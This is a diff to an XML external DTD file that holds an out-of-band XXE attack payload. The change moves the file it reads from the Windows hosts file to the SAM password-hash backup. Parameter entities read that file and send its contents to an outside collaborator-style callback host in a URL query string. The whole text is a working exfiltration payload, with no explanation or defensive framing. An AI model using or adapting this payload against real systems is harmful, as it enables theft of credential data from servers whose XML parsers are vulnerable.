@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+<!ENTITY % file SYSTEM "file:///C:/WINDOWS/Repair/SAM">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://i1kb6aop6c4k29pzpwt269bqthzcn1.pentestcollaborator.com/?x=%file;'>">
 %eval;
 %exfiltrate;
